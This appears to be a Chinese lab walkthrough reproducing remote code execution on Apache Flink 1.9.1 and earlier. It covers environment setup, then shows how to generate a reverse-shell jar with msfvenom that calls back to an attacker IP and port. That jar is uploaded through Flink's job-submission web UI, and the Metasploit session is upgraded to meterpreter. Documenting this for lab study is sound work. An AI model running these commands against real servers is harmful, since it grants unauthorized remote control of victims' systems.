Apache Flink概述：  
Apache Flink 是一个分布式大数据处理引擎，可对有限数据流和无限数据流进行有状态或无状态的计算，能够部署在各种集群环境，对各种规模大小的数据进行快速计算。  

漏洞影响版本：  
Apache Flink <= 1.9.1  

环境搭建（ubuntu16.04_x64_en-us + flink-1.9.1-bin-scala_2.11）：  
flink-1.9.1-bin-scala_2.11下载地址：https://archive.apache.org/dist/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz  
flink-1.9.1-bin-scala_2.11备用下载，提取码：nwkr，地址：https://pan.baidu.com/s/17NyDp7-qkLjrEwpzTtZR_w  
tar -xvf ./flink-1.9.1-bin-scala_2.11 && cd ./flink-1.9.1/bin/ && ./start-cluster.sh  
浏览器访问http://192.168.149.141:8081/ 验证服务是否成功启动，如下图所示为成功启动：  
![image](./0.png)  

漏洞利用（kali2019_x64_en-us）：  
msfvenom生成恶意jar包，命令如下：  
msfvenom -p java/shell_reverse_tcp lhost=192.168.149.130 lport=8800 -f jar -o shell.jar  
启动并监听msf命令如下：  
msfconsole  
set payload java/shell_reverse_tcp  
set lhost 192.168.149.130  
set lport 8800  
run  
浏览器访问如下界面：  
![image](./1.png)  
我这里已经实验过了，所以会有提交记录  
操作过程：点击Add New->选择之前生成的shell.jar->再点击Submit，如下图：  
![image](./2.png)  
之前监听的msf会收到反连，如下图：  
![image](./3.png)  
将shell转换为meterpreter，命令如下：  
background # 选择y  
sessions # 查看会话  
sessions -u 1 # 将会话1转为meterpreter会话  
sessions # 再次查看会话  
sessions -i 2 # 进入会话2  
成功后如下图：  
![image](./4.png)  
